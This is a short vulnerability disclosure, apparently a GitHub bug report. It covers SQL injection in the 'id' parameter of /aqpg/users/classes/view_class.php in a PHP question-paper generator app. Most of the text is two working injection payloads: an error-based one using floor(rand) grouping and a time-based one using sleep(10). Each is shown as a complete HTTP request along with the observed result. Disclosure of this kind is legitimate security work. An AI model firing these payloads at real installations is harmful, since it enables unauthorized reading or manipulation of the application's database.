# Automatic Question Paper Generator System v1.0 has SQL injection

BUG_Author:sixiaokai

Website source address:https://www.sourcecodester.com/php/15190/automatic-question-paper-generator-system-phpoop-free-source-code.html

Vulnerability File: /aqpg/users/classes/view_class.php

GET parameter 'id' exists SQL injection vulnerability

Payload1:id=1' and (select 5 from(select count(*),concat(0x71727374,(select (elt(233=233,1))),0x61626364,floor(rand(0)*2))x from information_schema.plugins group by x)a) and 'b'='b

```
GET /aqpg/users/classes/view_class.php?id=1%27%20and%20(select%205%20from(select%20count(*),concat(0x71727374,(select%20(elt(233=233,1))),0x61626364,floor(rand(0)*2))x%20from%20information_schema.plugins%20group%20by%20x)a)%20and%20%27b%27=%27b HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=v09icqq9rmfo32ghml3dote35g
Connection: close
```

Injection success based on errors

![image](https://github.com/si-xiao-kai/bug_report/blob/main/sql1.png)

Payload2:id=1' and (select 1 from (select(sleep(10)))a) AND 'b'='b

```
GET /aqpg/users/classes/view_class.php?id=1%27%20and%20(select%201%20from%20(select(sleep(10)))a)%20AND%20%27b%27=%27b HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=v09icqq9rmfo32ghml3dote35g
Connection: close
```

Server response time is 10 seconds

![image](https://github.com/si-xiao-kai/bug_report/blob/main/sql2.png)
